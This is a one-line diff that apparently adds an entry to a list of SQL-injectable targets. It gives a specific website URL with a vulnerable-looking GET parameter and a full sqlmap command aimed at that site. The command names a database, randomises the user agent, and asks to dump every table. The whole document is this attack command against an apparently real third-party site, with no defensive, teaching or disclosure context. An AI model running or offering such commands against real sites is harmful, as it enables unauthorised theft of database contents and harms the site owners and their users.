@@ -1,0 +1,1 @@
+http://pmsconsult1.dominiotemporario.com/index.php?pg=pg&i=30 (GET)  # sqlmap.py -u http://pmsconsult1.dominiotemporario.com/index.php?pg=pg&i=30 -D pmsconsult1_2 --threads 5 -v3 --random-agent --tables --dump-all
